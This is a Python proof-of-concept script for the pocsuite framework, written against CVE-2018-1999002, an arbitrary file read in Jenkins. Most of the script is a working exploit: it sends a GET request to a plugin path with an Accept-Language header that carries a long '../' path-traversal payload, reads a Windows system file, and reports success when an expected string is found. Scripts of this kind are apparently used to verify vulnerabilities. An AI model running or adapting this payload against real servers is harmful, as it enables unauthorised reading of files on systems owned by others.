#!/usr/bin/python
# -*- coding: UTF-8 -*-

"""
Copyright (c) 2014-2015 pocsuite developers (http://seebug.org)
See the file 'docs/COPYING' for copying permission
"""

# requests
from pocsuite.api.request import req
# register
from pocsuite.api.poc import register
# report
from pocsuite.api.poc import Output, POCBase
# url转换host
from pocsuite.lib.utils.funs import url2ip

import sys
reload(sys)
sys.setdefaultencoding('utf-8')




# 基础父类
class JenkinsPOC(POCBase):
    vulID = '43'  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    version = '1'  # 默认为1
    vulDate = '2018-07-26'  # 漏洞公开的时间,不知道就写今天

    author = 'r00t4dm'  # PoC作者的大名
    createDate = '2018-07-26'  # 编写 PoC 的日期
    updateDate = '2017-07-26'  # PoC 更新的时间,默认和编写时间一样
    references = 'https://nvd.nist.gov/vuln/detail/CVE-2018-1999002'  # 漏洞地址来源,0day不用写
    name = 'Jenkins arbitrary file read'  # PoC 名称
    appPowerLink = 'https://jenkins.io/'  # 漏洞厂商主页地址
    appName = 'Jenkins'  # 漏洞应用名称
    appVersion = 'Jenkins 2.132 and earlier, 2.121.1 and earlier'  # 漏洞影响版本
    vulType = 'arbitrary file read'  # 漏洞类型,类型参考见 漏洞类型规范表
    desc = '''
        Jenkins任意文件读取漏洞
    '''  # 漏洞简要描述
    samples = []  # 测试样列,就是用 PoC 测试成功的网站
    install_requires = []  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    cvss = u"高危"  # 严重,高危,中危,低危

    # 指纹方法
    def _fingerprint(self):
        pass
    def _verify(self):
        result = {}
        #获取漏洞url
        #如果设置端口则取端口,没有设置则为默认端口
        import re
        vul_url = "%s"%self.url
        # from pocsuite.lib.utils.funs import url2ip
        _port = re.findall(':(\d+)\s*', vul_url)
        if len(_port) != 0:
            _host = url2ip(vul_url)[0]
            _port = url2ip(vul_url)[1]
        else :
            _host = url2ip(vul_url)
            _port = "8080"

        vul_ip = "http://%s:%s" % (_host, _port)



        import hashlib
        # 会话保持
        output = Output(self)
        file_name = "windows/win"
        BACKDIR_COUNT = 8

        header = {'Accept-Language': ('../' * BACKDIR_COUNT) + file_name}
        try:
            vulurl = vul_ip+ '/plugin/credentials/.ini'
            vulurltest = req.get(vulurl, headers=header)
            if "MPEGVideo" in vulurltest.text:
                if vulurltest.text.find('version'):
                    result['VerifyInfo'] = {}
                    result['VerifyInfo']['url'] = vulurl
                    result['VerifyInfo']['Payload'] = header
        except Exception as e:
            pass

        return self.save_output(result)

    # 攻击模块
    def _attack(self):
        return self._verify()

    # 输出报告
    def save_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail()
        return output


# 注册类
register(JenkinsPOC)


